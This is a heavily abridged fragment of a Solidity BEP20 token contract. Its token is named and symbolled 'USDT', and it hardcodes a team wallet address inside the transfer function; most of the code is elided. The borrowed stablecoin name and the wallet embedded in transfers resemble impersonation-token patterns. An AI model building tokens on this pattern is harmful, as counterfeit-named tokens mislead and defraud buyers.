...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    function _transfer(
        ...
        address teamWalletAddress = 0x199Fcad6F8E883562e74688A175542d1344beE0C;
...
contract Token is BEP20('USDT', 'USDT', 100000000*1e18) {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    ...
    */
    ...
    function _setAutomatedMarketMakerPair(address pair, uint256 value) private {
        require(
            address(this) != pair,
